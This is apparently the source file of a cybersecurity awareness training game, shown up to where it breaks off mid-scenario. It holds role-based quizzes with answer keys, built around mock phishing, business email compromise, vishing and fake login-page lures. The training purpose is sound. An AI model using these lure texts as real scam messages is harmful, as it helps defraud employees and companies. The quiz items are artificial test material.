// FIREWALL: Chronicles of the NetGuard
// Cybersecurity Awareness Training Game
// Role-based scenarios with realistic artifacts and comprehensive reporting

console.log('game.js loading...');

class CyberGuardGame {
    constructor() {
        this.gameState = {
            playerName: 'Agent',
            playerRole: 'employee',
            security: 100,
            maxSecurity: 100,
            xp: 0,
            level: 1,
            reputation: 0,
            currentChapter: 1,
            currentScenario: 0,
            gameStarted: false,
            soundEnabled: true
        };
        
        // Performance tracking by category
        this.performanceTracking = {
            phishing: { correct: 0, total: 0 },
            socialEngineering: { correct: 0, total: 0 },
            malware: { correct: 0, total: 0 },
            passwordSecurity: { correct: 0, total: 0 },
            dataProtection: { correct: 0, total: 0 },
            physicalSecurity: { correct: 0, total: 0 },
            incidentResponse: { correct: 0, total: 0 },
            secureConfiguration: { correct: 0, total: 0 }
        };
        
        // Track specific mistakes for the report
        this.mistakes = [];
        
        // Role definitions
        this.roles = {
            employee: { name: 'Employee', icon: '👤', description: 'General staff member' },
            manager: { name: 'Manager', icon: '👔', description: 'Team lead / Supervisor' },
            executive: { name: 'Executive', icon: '🎯', description: 'C-Suite / Director' },
            helpdesk: { name: 'IT Help Desk', icon: '🎧', description: 'IT Support staff' },
            analyst: { name: 'Security Analyst', icon: '🔍', description: 'SOC / Threat analyst' },
            engineer: { name: 'Security Engineer', icon: '⚙️', description: 'SecOps / Infrastructure' },
            responder: { name: 'Incident Responder', icon: '🚨', description: 'IR / Forensics team' }
        };
        
        this.initScenarios();
        this.init();
    }

    init() {
        try {
            this.initParticles();
        } catch (e) {
            console.log('Particle animation not available');
        }
        this.bindKeyboardShortcuts();
    }

    initScenarios() {
        // Scenarios organized by role and chapter
        this.scenarios = {
            // ==========================================
            // EMPLOYEE SCENARIOS
            // ==========================================
            employee: {
                1: {
                    name: "Email Security Basics",
                    description: "Learn to identify phishing emails and malicious attachments.",
                    scenarios: [
                        {
                            id: 'emp_phish_1',
                            type: 'email',
                            category: 'phishing',
                            difficulty: 'easy',
                            setup: 'You receive this email in your inbox:',
                            content: {
                                from: { name: 'IT Security Team', email: 'security@company-helpdesk.net', external: true },
                                to: 'you@company.com',
                                subject: '⚠️ URGENT: Your password expires in 24 hours!',
                                time: '9:15 AM',
                                body: `Dear Employee,

Our records indicate your password will expire in 24 hours. To avoid losing access to your account, please click the link below to verify your credentials immediately.

<a href="#">https://company-secure-login.net/verify</a>

Failure to act within 24 hours will result in account suspension.

Best regards,
IT Security Team`,
                                warning: 'This message was sent from outside your organization'
                            },
                            question: "What should you do with this email?",
                            choices: [
                                { id: 'a', text: "Click the link and update my password to avoid account suspension" },
                                { id: 'b', text: "Forward it to a coworker to see if they got the same email" },
                                { id: 'c', text: "Report it as phishing and delete it - the sender domain is suspicious" },
                                { id: 'd', text: "Reply asking if this is legitimate" }
                            ],
                            correct: 'c',
                            explanation: "This is a classic phishing email. Red flags: External sender claiming to be internal IT, urgency tactics, suspicious domain (company-helpdesk.net instead of company.com), and generic greeting.",
                            lesson: "Check sender email addresses carefully - legitimate IT teams use your company's actual domain."
                        },
                        {
                            id: 'emp_phish_2',
                            type: 'email',
                            category: 'phishing',
                            difficulty: 'medium',
                            setup: 'You receive this email from what appears to be your CEO:',
                            content: {
                                from: { name: 'Michael Chen (CEO)', email: 'm.chen@cornpany.com', external: true },
                                to: 'you@company.com',
                                subject: 'Quick favor needed',
                                time: '4:47 PM',
                                body: `Hi,

I'm currently in a meeting and need your help with something urgent. Can you purchase some gift cards for a client appreciation event? I'll reimburse you afterwards.

Please get 5 x $200 Amazon gift cards and send me the codes as soon as possible.

Thanks,
Michael Chen
CEO

Sent from my iPhone`,
                                warning: null
                            },
                            question: "How should you respond to this request?",
                            choices: [
                                { id: 'a', text: "Purchase the gift cards immediately - the CEO needs help" },
                                { id: 'b', text: "Ask a coworker to help split the cost" },
                                { id: 'c', text: "Verify the request by calling or messaging the CEO through official channels" },
                                { id: 'd', text: "Reply to the email asking for more details" }
                            ],
                            correct: 'c',
                            explanation: "This is a Business Email Compromise (BEC) attack. Notice the misspelled domain 'cornpany.com' instead of 'company.com'. Gift card requests are a major red flag.",
                            lesson: "Executives will never ask you to purchase gift cards via email. Always verify through official channels."
                        },
                        {
                            id: 'emp_attach_1',
                            type: 'email',
                            category: 'malware',
                            difficulty: 'medium',
                            setup: 'A vendor you occasionally work with sends this email:',
                            content: {
                                from: { name: 'Sarah Johnson - Acme Supplies', email: 'sjohnson@acme-supplies.com', external: true },
                                to: 'you@company.com',
                                subject: 'RE: Updated Invoice #4521',
                                time: '11:23 AM',
                                body: `Hi,

Please find attached the updated invoice we discussed. Let me know if you have any questions.

Thanks!
Sarah`,
                                attachment: { name: 'Invoice_4521.pdf.exe', suspicious: true },
                                warning: null
                            },
                            question: "What should you do with this attachment?",
                            choices: [
                                { id: 'a', text: "Open it - we do work with Acme Supplies" },
                                { id: 'b', text: "Save it to my desktop and scan it later" },
                                { id: 'c', text: "Don't open it - the .exe extension is suspicious. Report to IT." },
                                { id: 'd', text: "Forward it to accounting to handle" }
                            ],
                            correct: 'c',
                            explanation: "The file has a double extension (.pdf.exe) which is a common malware trick. The .exe is the actual extension, meaning this is an executable program, not a PDF.",
                            lesson: "Watch for double file extensions - attackers disguise malware as documents."
                        },
                        {
                            id: 'emp_social_1',
                            type: 'phone',
                            category: 'socialEngineering',
                            difficulty: 'medium',
                            setup: 'You receive a phone call:',
                            content: {
                                caller: 'IT Support',
                                transcript: `"Hi, this is James from IT Support. We've detected unusual activity on your computer and need to run some security checks. I'll need you to install a remote access tool so I can take a look. Can you go to remote-helpdesk.com and download our support software?"`
                            },
                            question: "How should you respond?",
                            choices: [
                                { id: 'a', text: "Follow the instructions - IT needs to fix my computer" },
                                { id: 'b', text: "Ask for their employee ID, then hang up and call IT directly using the official number" },
                                { id: 'c', text: "Give them my password so they can check remotely" },
                                { id: 'd', text: "Install the software but don't give them any passwords" }
                            ],
                            correct: 'b',
                            explanation: "This is a vishing (voice phishing) attack. Legitimate IT support won't cold-call and ask you to install remote access software.",
                            lesson: "If someone calls claiming to be IT support, hang up and call back using official numbers."
                        },
                        {
                            id: 'emp_link_1',
                            type: 'chat',
                            category: 'phishing',
                            difficulty: 'easy',
                            setup: 'You receive this message on Slack from a colleague:',
                            content: {
                                channel: 'Direct Message',
                                messages: [
                                    { user: 'Tom Peters', userType: 'internal', time: '2:34 PM', text: 'Hey! Check out this article about our competitor - pretty interesting stuff 👀' },
                                    { user: 'Tom Peters', userType: 'internal', time: '2:34 PM', text: '<a href="#">https://bit.ly/3xK9mPq</a>' }
                                ]
                            },
                            question: "What's the safest approach?",
                            choices: [
                                { id: 'a', text: "Click the link - Tom is a trusted colleague" },
                                { id: 'b', text: "Hover over or expand the shortened URL first to see where it actually goes" },
                                { id: 'c', text: "Copy and paste the link into a new browser window" },
                                { id: 'd', text: "Ask Tom in person or via another channel if he sent this" }
                            ],
                            correct: 'd',
                            explanation: "While colleagues are generally trusted, their accounts can be compromised. Shortened URLs hide the real destination. Verify unusual messages through another channel.",
                            lesson: "Even messages from known contacts could be from compromised accounts. Verify unexpected links."
                        }
                    ],
                    boss: {
                        id: 'phish_master',
                        name: 'THE PHISH MASTER',
                        title: 'Lord of Deceptive Emails',
                        avatar: '🎣',
                        health: 100,
                        dialogue: [
                            "Ah, another gullible employee! My phishing emails have fooled thousands...",
                            "You think you can spot my traps? Let's see how you handle THIS!"
                        ],
                        attacks: [
                            {
                                name: "Urgent CEO Request",
                                description: "A sophisticated spear-phishing attack",
                                scenario: {
                                    type: 'email',
                                    category: 'phishing',
                                    content: {
                                        from: { name: 'CEO Office', email: 'ceo.office@company-corp.org', external: true },
                                        subject: 'URGENT: Wire Transfer Required',
                                        body: 'I need you to process an urgent wire transfer of $45,000 to a new vendor. This is time-sensitive and confidential.'
                                    },
                                    question: "How do you respond to this urgent request?",
                                    choices: [
                                        { id: 'a', text: "Process the transfer - it's from the CEO" },
                                        { id: 'b', text: "Verify through official channels before taking any action" },
                                        { id: 'c', text: "Reply asking for more information" },
                                        { id: 'd', text: "Forward to your manager" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 25
                            },
                            {
                                name: "Fake Security Alert",
                                description: "A convincing security warning",
                                scenario: {
                                    type: 'browser',
                                    category: 'phishing',
                                    content: {
                                        url: 'microsoft-account-verify.com',
                                        domain: 'microsoft-account-verify.com',
                                        suspiciousDomain: true,
                                        secure: true,
                                        loginForm: { logo: 'Microsoft', title: 'Verify Your Account', subtitle: 'Unusual activity detected' }
                                    },
                                    question: "You clicked a link in an email and see this page. What do you do?",
                                    choices: [
                                        { id: 'a', text: "Enter credentials - it looks like Microsoft" },
                                        { id: 'b', text: "Close the page - the domain is not microsoft.com" },
                                        { id: 'c', text: "Check if the padlock is green first" },
                                        { id: 'd', text: "Enter a fake password to test" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 25
                            }
                        ]
                    }
                },
                2: {
                    name: "Access Control & Data Protection",
                    description: "Protect your credentials and handle sensitive data responsibly.",
                    scenarios: [
                        {
                            id: 'emp_pass_1',
                            type: 'browser',
                            category: 'passwordSecurity',
                            difficulty: 'easy',
                            setup: 'While logging into your bank, you see this browser notification:',
                            content: {
                                url: 'bankofamerica.com',
                                secure: true,
                                popup: {
                                    type: 'info',
                                    title: 'Save Password?',
                                    message: 'Would you like Chrome to save your password for bankofamerica.com?',
                                    buttons: ['Save', 'Never', 'Not Now']
                                }
                            },
                            question: "On your work computer, should you save passwords in the browser?",
                            choices: [
                                { id: 'a', text: "Yes, it's convenient and Chrome is secure" },
                                { id: 'b', text: "Yes, but only for non-work accounts" },
                                { id: 'c', text: "No - use a company-approved password manager instead" },
                                { id: 'd', text: "Yes, it's fine if I lock my computer when away" }
                            ],
                            correct: 'c',
                            explanation: "Browser-saved passwords can be extracted if your computer is compromised. Company-approved password managers offer better security with encryption.",
                            lesson: "Use your organization's approved password manager instead of browser-stored passwords."
                        },
                        {
                            id: 'emp_pass_2',
                            type: 'scenario',
                            category: 'passwordSecurity',
                            difficulty: 'medium',
                            setup: 'A coworker asks to borrow your login credentials:',
                            content: {
                                context: 'Your colleague Sarah approaches your desk looking stressed.',
                                quote: '"Hey, my account got locked and IT said it\'ll take an hour to fix. Can I just use your login real quick to pull up that Q3 report? The deadline is in 30 minutes!"'
                            },
                            question: "What should you do?",
                            choices: [
                                { id: 'a', text: "Share your credentials - Sarah is trustworthy and it's urgent" },
                                { id: 'b', text: "Log in yourself and let Sarah use your computer while you watch" },
                                { id: 'c', text: "Refuse and suggest Sarah escalate the IT ticket or ask her manager for help" },
                                { id: 'd', text: "Give her your password but change it right after" }
                            ],
                            correct: 'c',
                            explanation: "Never share credentials, even with trusted colleagues. If Sarah uses your account and makes a mistake, YOU are held responsible.",
                            lesson: "Never share your credentials - any actions taken under your account are your responsibility."
                        },
                        {
                            id: 'emp_mfa_1',
                            type: 'sms',
                            category: 'phishing',
                            difficulty: 'hard',
                            setup: 'You receive this text message:',
                            content: {
                                number: '+1 (555) 123-4567',
                                messages: [
                                    { type: 'received', text: '[CompanyName] Security Alert: Unusual login detected from Russia. If this was not you, verify your identity: company-secure.com/verify', time: '3:42 PM' }
                                ]
                            },
                            question: "What's the best response?",
                            choices: [
                                { id: 'a', text: "Click the link immediately to secure my account" },
                                { id: 'b', text: "Ignore it - it's probably spam" },
                                { id: 'c', text: "Go directly to the official company portal and check your account security there" },
                                { id: 'd', text: "Reply STOP to unsubscribe from alerts" }
                            ],
                            correct: 'c',
                            explanation: "Even if this might be legitimate, never click links in unexpected security texts. Go directly to the official site by typing the URL yourself.",
                            lesson: "Never click security alert links in texts - go directly to the official website instead."
                        },
                        {
                            id: 'emp_physical_1',
                            type: 'scenario',
                            category: 'physicalSecurity',
                            difficulty: 'medium',
                            setup: 'You\'re leaving for lunch and a delivery person is near the secure door:',
                            content: {
                                context: 'The person is wearing a FedEx uniform and carrying a heavy package.',
                                quote: '"Hey, can you hold the door? This package is for someone on the 5th floor and my badge isn\'t working."'
                            },
                            question: "What should you do?",
                            choices: [
                                { id: 'a', text: "Hold the door - they're clearly a delivery person" },
                                { id: 'b', text: "Offer to take the package for them" },
                                { id: 'c', text: "Politely direct them to the front reception to get a visitor badge" },
                                { id: 'd', text: "Call the 5th floor to come get their package" }
                            ],
                            correct: 'c',
                            explanation: "This is a classic 'tailgating' attempt. Uniforms can be faked or stolen. Always direct unknown visitors to reception.",
                            lesson: "Never hold secure doors for strangers - direct them to proper check-in procedures."
                        },
                        {
                            id: 'emp_data_1',
                            type: 'scenario',
                            category: 'dataProtection',
                            difficulty: 'medium',
                            setup: 'You need to send customer data to an external contractor:',
                            content: {
                                context: 'The spreadsheet contains names, emails, and phone numbers of 500 customers.',
                                quote: 'The contractor needs this data for a marketing campaign and says to "just email it over."'
                            },
                            question: "What's the safest way to share this data?",
                            choices: [
                                { id: 'a', text: "Email it directly - they need it for their work" },
                                { id: 'b', text: "Upload to a password-protected file sharing service" },
                                { id: 'c', text: "Check with your manager/compliance about proper data sharing procedures first" },
                                { id: 'd', text: "Put it on a USB drive and mail it" }
                            ],
                            correct: 'c',
                            explanation: "Customer data may be protected by privacy regulations (GDPR, CCPA). Before sharing any personal data externally, verify proper authorization and procedures.",
                            lesson: "Always verify data sharing procedures before sending personal information to external parties."
                        }
                    ],
                    boss: {
                        id: 'credential_thief',
                        name: 'CREDENTIAL THIEF',
                        title: 'Harvester of Passwords',
                        avatar: '🔐',
                        health: 100,
                        dialogue: [
                            "Passwords are my currency. Let's see how easily you give up yours...",
                            "Even the strongest password is useless if you share it!"
                        ],
                        attacks: [
                            {
                                name: "Fake Login Portal",
                                description: "A convincing fake login page",
                                scenario: {
                                    type: 'browser',
                                    category: 'phishing',
                                    content: {
                                        url: 'microsoft365-login.com/signin',
                                        domain: 'microsoft365-login.com',
                                        suspiciousDomain: true,
                                        secure: true,
                                        loginForm: { logo: 'Microsoft', title: 'Sign in', subtitle: 'Use your work account' }
                                    },
                                    question: "This page asks for your Microsoft 365 credentials. What do you notice?",
                                    choices: [
                                        { id: 'a', text: "Looks legitimate - enter my credentials" },
                                        { id: 'b', text: "The domain is wrong - it should be microsoft.com" },
                                        { id: 'c', text: "The padlock shows it's secure, so it's safe" },
                                        { id: 'd', text: "Report as suspicious but enter credentials anyway" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            },
                            {
                                name: "Password Reset Scam",
                                description: "A fake password reset email",
                                scenario: {
                                    type: 'email',
                                    category: 'phishing',
                                    content: {
                                        from: { name: 'Password Service', email: 'noreply@password-reset-service.com', external: true },
                                        subject: 'Password Reset Required',
                                        body: 'Your password has been compromised. Click here to reset immediately or your account will be locked.'
                                    },
                                    question: "What's wrong with this password reset email?",
                                    choices: [
                                        { id: 'a', text: "Nothing - reset my password to be safe" },
                                        { id: 'b', text: "It's from an external domain, not our company. Report it." },
                                        { id: 'c', text: "Forward to coworkers as a warning" },
                                        { id: 'd', text: "Reply asking for verification" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            }
                        ]
                    }
                }
            },
            
            // ==========================================
            // MANAGER SCENARIOS
            // ==========================================
            manager: {
                1: {
                    name: "Leadership Security Challenges",
                    description: "Handle security situations specific to team leaders and managers.",
                    scenarios: [
                        {
                            id: 'mgr_bec_1',
                            type: 'email',
                            category: 'phishing',
                            difficulty: 'hard',
                            setup: 'You receive this email appearing to be from your VP:',
                            content: {
                                from: { name: 'Jennifer Walsh (VP Operations)', email: 'jennifer.walsh@company-inc.com', external: true },
                                to: 'you@company.com',
                                subject: 'Confidential - Bonus Processing',
                                time: '8:02 AM',
                                body: `Hi,

I'm working on a confidential project and need your help. We're processing early bonuses for your team but need updated direct deposit information.

Can you send me a list of your direct reports with their:
- Full names
- Bank account numbers
- Routing numbers

This needs to stay between us until the announcement. Please send by EOD.

Thanks,
Jennifer Walsh
VP of Operations`
                            },
                            question: "How should you handle this request?",
                            choices: [
                                { id: 'a', text: "Gather the information and send it - VP's orders" },
                                { id: 'b', text: "Send it but CC your VP on the email" },
                                { id: 'c', text: "Call Jennifer directly to verify this request - it has several red flags" },
                                { id: 'd', text: "Tell your team about the upcoming bonuses first" }
                            ],
                            correct: 'c',
                            explanation: "This is a Business Email Compromise (BEC) attack targeting managers. Red flags: External domain, request for sensitive financial data, urgency, and secrecy.",
                            lesson: "Requests for employee financial data should always be verified through official HR channels."
                        },
                        {
                            id: 'mgr_approval_1',
                            type: 'email',
                            category: 'socialEngineering',
                            difficulty: 'medium',
                            setup: 'You receive an urgent invoice approval request:',
                            content: {
                                from: { name: 'Accounts Payable', email: 'ap@company.com', external: false },
                                to: 'you@company.com',
                                subject: 'FW: URGENT - Invoice needs approval',
                                time: '4:58 PM',
                                body: `Hi,

Legal said this invoice must be paid today or we face a $50,000 penalty. The vendor (GlobalTech Partners) is threatening legal action.

Amount: $23,450.00
Vendor: GlobalTech Partners LLC
Invoice: GT-2024-8891

Our VP already approved but we need your sign-off. Reply with approval ASAP.

Thanks,
AP Team`,
                                attachment: { name: 'Invoice_GT-2024-8891.pdf', suspicious: false }
                            },
                            question: "What should you do before approving?",
                            choices: [
                                { id: 'a', text: "Approve immediately - don't want a $50K penalty" },
                                { id: 'b', text: "Verify the vendor and invoice through official procurement records first" },
                                { id: 'c', text: "Forward to your VP to handle" },
                                { id: 'd', text: "Call the phone number on the invoice to verify" }
                            ],
                            correct: 'b',
                            explanation: "Urgent financial requests are a classic fraud tactic. Always verify vendors exist in your system and check if services were actually rendered.",
                            lesson: "Always verify vendor legitimacy through official procurement channels before approving payments."
                        },
                        {
                            id: 'mgr_team_1',
                            type: 'scenario',
                            category: 'incidentResponse',
                            difficulty: 'medium',
                            setup: 'A team member approaches you nervously:',
                            content: {
                                context: 'Your employee looks worried.',
                                quote: '"Hey boss, I think I messed up. I clicked on a link in an email about a package delivery, and my computer started acting weird. It was like 3 hours ago..."'
                            },
                            question: "What's your immediate response?",
                            choices: [
                                { id: 'a', text: "Tell them to run antivirus and monitor it" },
                                { id: 'b', text: "Have them disconnect from the network immediately and report to IT Security right away" },
                                { id: 'c', text: "Reprimand them for waiting 3 hours to tell you" },
                                { id: 'd', text: "Check their computer yourself to see what's wrong" }
                            ],
                            correct: 'b',
                            explanation: "Immediate network isolation limits potential spread of malware. Report to IT Security immediately - they have tools to assess and contain threats.",
                            lesson: "When an employee reports a potential security incident, prioritize containment over blame."
                        },
                        {
                            id: 'mgr_access_1',
                            type: 'ticket',
                            category: 'dataProtection',
                            difficulty: 'medium',
                            setup: 'You receive this IT access request to approve:',
                            content: {
                                ticketId: 'REQ-2024-4412',
                                title: 'Access Request - Finance Shared Drive',
                                priority: 'High',
                                requester: { name: 'Alex Chen', role: 'Marketing Coordinator' },
                                details: 'Need access to Finance shared drive for cross-functional project. Marketing director said to request access.',
                                manager: 'You'
                            },
                            question: "How should you handle this access request?",
                            choices: [
                                { id: 'a', text: "Approve - Alex says the Marketing director authorized it" },
                                { id: 'b', text: "Deny - Marketing doesn't need finance access" },
                                { id: 'c', text: "Verify the business need, confirm with Marketing director, and consider limited access if justified" },
                                { id: 'd', text: "Forward to Finance to decide" }
                            ],
                            correct: 'c',
                            explanation: "Follow the principle of least privilege - verify the actual business need, get confirmation from the stated approver, and if justified, provide only the specific access needed.",
                            lesson: "Always verify business need and apply least-privilege principles when approving access requests."
                        },
                        {
                            id: 'mgr_vendor_1',
                            type: 'email',
                            category: 'phishing',
                            difficulty: 'hard',
                            setup: 'A vendor you work with regularly sends this email:',
                            content: {
                                from: { name: 'David Kim - TechPro Solutions', email: 'd.kim@techpr0-solutions.com', external: true },
                                to: 'you@company.com',
                                subject: 'Banking Details Update',
                                time: '11:45 AM',
                                body: `Hi,

Quick heads up - we've switched banks and need you to update our payment information for future invoices.

New Details:
Bank: First National Bank
Account: 8847291034
Routing: 021000089

Please update this before processing our next invoice.

Thanks,
David Kim
Account Manager
TechPro Solutions`
                            },
                            question: "Before updating the payment information, what should you do?",
                            choices: [
                                { id: 'a', text: "Update the info - David is our regular contact" },
                                { id: 'b', text: "Reply to this email asking for confirmation" },
                                { id: 'c', text: "Call TechPro's official number to verify this change with someone other than David" },
                                { id: 'd', text: "Forward to AP and let them handle it" }
                            ],
                            correct: 'c',
                            explanation: "Vendor payment redirect fraud is extremely common. Notice the '0' in 'techpr0-solutions' instead of 'o'. Always verify banking changes through official channels.",
                            lesson: "Verify all vendor banking changes by calling official numbers from your records."
                        }
                    ],
                    boss: {
                        id: 'bec_mastermind',
                        name: 'BEC MASTERMIND',
                        title: 'Executive Impersonator',
                        avatar: '🎭',
                        health: 100,
                        dialogue: [
                            "Managers are my favorite targets - so eager to please the boss!",
                            "One 'urgent' email and your whole team's data is mine!"
                        ],
                        attacks: [
                            {
                                name: "Executive Wire Request",
                                description: "Impersonating the CEO for a wire transfer",
                                scenario: {
                                    type: 'email',
                                    category: 'phishing',
                                    content: {
                                        from: { name: 'CEO', email: 'ceo-office@company-exec.com', external: true },
                                        subject: 'Confidential acquisition - wire needed',
                                        body: 'We are finalizing a confidential acquisition. I need you to wire $125,000 to the escrow account today. Do not discuss this with anyone.'
                                    },
                                    question: "Your response?",
                                    choices: [
                                        { id: 'a', text: "Process the wire - CEO says it's confidential" },
                                        { id: 'b', text: "Call the CEO on their known number to verify before taking any action" },
                                        { id: 'c', text: "Reply asking for more details" },
                                        { id: 'd', text: "Forward to accounting" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            },
                            {
                                name: "Fake Employee Emergency",
                                description: "Impersonating HR about an employee",
                                scenario: {
                                    type: 'email',
                                    category: 'socialEngineering',
                                    content: {
                                        from: { name: 'HR Benefits', email: 'hr-benefits@company-hr.net', external: true },
                                        subject: 'Employee Emergency - Urgent Response Needed',
                                        body: 'One of your team members has a medical emergency and needs their direct deposit changed immediately for insurance purposes. Please provide their banking info.'
                                    },
                                    question: "How do you respond?",
                                    choices: [
                                        { id: 'a', text: "Send the information to help the employee" },
                                        { id: 'b', text: "Contact HR through official channels to verify this request" },
                                        { id: 'c', text: "Reply asking which employee" },
                                        { id: 'd', text: "Ignore it" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            }
                        ]
                    }
                }
            },
            
            // ==========================================
            // EXECUTIVE SCENARIOS
            // ==========================================
            executive: {
                1: {
                    name: "Executive Target: Whaling Attacks",
                    description: "Executives face sophisticated, high-value targeted attacks.",
                    scenarios: [
                        {
                            id: 'exec_whale_1',
                            type: 'email',
                            category: 'phishing',
                            difficulty: 'hard',
                            setup: 'You receive this email from your legal firm:',
                            content: {
                                from: { name: 'Robert Taylor, Esq.', email: 'rtaylor@smithtaylor-legal.com', external: true },
                                to: 'ceo@company.com',
                                subject: 'PRIVILEGED & CONFIDENTIAL: Pending Litigation Matter',
                                time: '7:23 AM',
                                body: `Dear Executive,

I'm reaching out regarding a sensitive employment litigation matter filed against your company yesterday. The plaintiff is seeking $2.3M in damages.

Given the confidential nature, I've prepared a case summary for your private review before we brief your legal team:

<a href="#">View Confidential Case Summary</a>

Please review before our 2pm call today. Do not forward this email.

Regards,
Robert Taylor, Partner
Smith & Taylor LLP
Privileged & Confidential`
                            },
                            question: "How should you proceed?",
                            choices: [
                                { id: 'a', text: "Click the link to review the confidential summary" },
                                { id: 'b', text: "Forward to your general counsel to review first" },
                                { id: 'c', text: "Contact your actual legal firm through known channels to verify" },
                                { id: 'd', text: "Reply asking for more information about the case" }
                            ],
                            correct: 'c',
                            explanation: "This is a whaling attack - sophisticated phishing targeting executives. Attackers research their targets and craft believable scenarios. Always verify through established relationships.",
                            lesson: "Verify unexpected legal or sensitive matters through your established relationships and known contact info."
                        },
                        {
                            id: 'exec_board_1',
                            type: 'email',
                            category: 'phishing',
                            difficulty: 'hard',
                            setup: 'This email arrives before a board meeting:',
                            content: {
                                from: { name: 'BoardDocs Support', email: 'support@board-docs-portal.com', external: true },
                                to: 'executive@company.com',
                                subject: 'Action Required: Board Meeting Materials',
                                time: '6:15 PM',
                                body: `Dear Board Member,

The Q4 board materials have been updated and require your acknowledgment before tomorrow's meeting.

Due to a system upgrade, you'll need to re-authenticate:

<a href="#">Access Board Portal</a>

Your session will expire in 2 hours if not confirmed.

BoardDocs Support Team`
                            },
                            question: "What's the safest approach?",
                            choices: [
                                { id: 'a', text: "Click and re-authenticate - the board meeting is tomorrow" },
                                { id: 'b', text: "Navigate directly to your known board portal URL and log in there" },
                                { id: 'c', text: "Reply asking if this is legitimate" },
                                { id: 'd', text: "Ignore it - assistant will handle board materials" }
                            ],
                            correct: 'b',
                            explanation: "Attackers time phishing attacks around important events like board meetings. Never click authentication links in emails - go directly to known URLs.",
                            lesson: "Always navigate directly to sensitive portals - never click login links in emails."
                        },
                        {
                            id: 'exec_ai_1',
                            type: 'phone',
                            category: 'socialEngineering',
                            difficulty: 'hard',
                            setup: 'You receive a voicemail that sounds exactly like your CFO:',
                            content: {
                                caller: 'CFO (Voicemail)',
                                transcript: `"Hey, it's [CFO Name]. I'm stuck in this investor meeting but we have an urgent wire that needs to go out for the acquisition closing. The bank needs your verbal authorization. Can you call them back at 555-0147? They need it in the next 30 minutes or we could lose the deal. Thanks."`
                            },
                            question: "How should you verify this request?",
                            choices: [
                                { id: 'a', text: "Call the number provided - it sounds exactly like the CFO" },
                                { id: 'b', text: "Call or text the CFO on their known number to verify" },
                                { id: 'c', text: "Call your bank's known number to check on the wire" },
                                { id: 'd', text: "Both B and C - verify through multiple independent channels" }
                            ],
                            correct: 'd',
                            explanation: "AI-generated voice cloning can now perfectly mimic anyone's voice. Always verify urgent financial requests through multiple independent channels.",
                            lesson: "AI can clone voices perfectly - always verify urgent requests through established channels."
                        },
                        {
                            id: 'exec_travel_1',
                            type: 'scenario',
                            category: 'physicalSecurity',
                            difficulty: 'medium',
                            setup: 'You\'re traveling internationally for a business meeting:',
                            content: {
                                context: 'The hotel concierge offers to store your devices in the hotel safe.',
                                quote: '"For your security, we recommend leaving laptops and phones in our secure safe. Many executives prefer this option."'
                            },
                            question: "What's the best practice for device security while traveling?",
                            choices: [
                                { id: 'a', text: "Use the hotel safe - they're designed for valuables" },
                                { id: 'b', text: "Keep devices with you at all times when traveling internationally" },
                                { id: 'c', text: "Leave them in your locked hotel room" },
                                { id: 'd', text: "It's fine either way - the hotel is reputable" }
                            ],
                            correct: 'b',
                            explanation: "When traveling internationally, devices should never leave your possession. Hotel safes and rooms can be accessed by third parties.",
                            lesson: "Keep devices with you during international travel - consider travel-specific devices for sensitive trips."
                        },
                        {
                            id: 'exec_social_1',
                            type: 'scenario',
                            category: 'socialEngineering',
                            difficulty: 'medium',
                            setup: 'At a conference, someone introduces themselves:',
                            content: {
                                context: 'A well-dressed person at a networking event approaches you.',
                                quote: '"Hi! I\'m a journalist writing about innovation in your industry. Could I ask a few questions about your company\'s upcoming product launch and partnership strategy?"'
                            },
                            question: "How should you respond?",
                            choices: [
                                { id: 'a', text: "Share some high-level information - it's good PR" },
                                { id: 'b', text: "Politely decline and refer them to your PR/communications team" },
                                { id: 'c', text: "Give them your business card to schedule an official interview" },
                                { id: 'd', text: "Ask for their credentials and publication details first" }
                            ],
                            correct: 'b',
                            explanation: "This could be social engineering or competitive intelligence gathering. Even 'harmless' details can be valuable to competitors or attackers.",
                            lesson: "Direct all media inquiries to your PR team - never share company information at conferences."
                        }
                    ],
                    boss: {
                        id: 'whaling_captain',
                        name: 'THE WHALING CAPTAIN',
                        title: 'Hunter of Big Fish',
                        avatar: '🐋',
                        health: 100,
                        dialogue: [
                            "Executives are my specialty. The bigger the fish, the bigger the prize!",
                            "Your authority makes you the perfect target..."
                        ],
                        attacks: [
                            {
                                name: "Board Credential Harvest",
                                description: "A sophisticated attack on executive credentials",
                                scenario: {
                                    type: 'browser',
                                    category: 'phishing',
                                    content: {
                                        url: 'secure-board-portal.com',
                                        domain: 'secure-board-portal.com',
                                        suspiciousDomain: true,
                                        secure: true,
                                        loginForm: { logo: 'BoardEffect', title: 'Board Portal Login' }
                                    },
                                    question: "Is this your board portal?",
                                    choices: [
                                        { id: 'a', text: "Yes, log in" },
                                        { id: 'b', text: "No - navigate to the official portal directly" },
                                        { id: 'c', text: "Check the SSL certificate" },
                                        { id: 'd', text: "Ask IT" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 35
                            },
                            {
                                name: "M&A Data Request",
                                description: "Fake M&A due diligence request",
                                scenario: {
                                    type: 'email',
                                    category: 'dataProtection',
                                    content: {
                                        from: { name: 'M&A Advisory', email: 'advisory@ma-partners.net', external: true },
                                        subject: 'Due Diligence Request - Confidential',
                                        body: 'Per our discussion, please provide the financial statements and customer list for the acquisition due diligence. NDA attached.'
                                    },
                                    question: "This appears to be about an acquisition. What do you do?",
                                    choices: [
                                        { id: 'a', text: "Send the requested documents" },
                                        { id: 'b', text: "Verify this request through your actual M&A advisors" },
                                        { id: 'c', text: "Reply asking for more details" },
                                        { id: 'd', text: "Forward to your CFO" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 35
                            }
                        ]
                    }
                }
            },
            
            // ==========================================
            // IT HELP DESK SCENARIOS
            // ==========================================
            helpdesk: {
                1: {
                    name: "Social Engineering at the Help Desk",
                    description: "Protect against attackers trying to manipulate IT support.",
                    scenarios: [
                        {
                            id: 'hd_reset_1',
                            type: 'ticket',
                            category: 'socialEngineering',
                            difficulty: 'medium',
                            setup: 'You receive this urgent ticket:',
                            content: {
                                ticketId: 'INC-2024-8847',
                                title: 'URGENT: Password Reset - CEO Executive Assistant',
                                priority: 'Urgent',
                                requester: { name: 'Unknown Caller', role: 'Claims to be Jessica Miller, EA to CEO' },
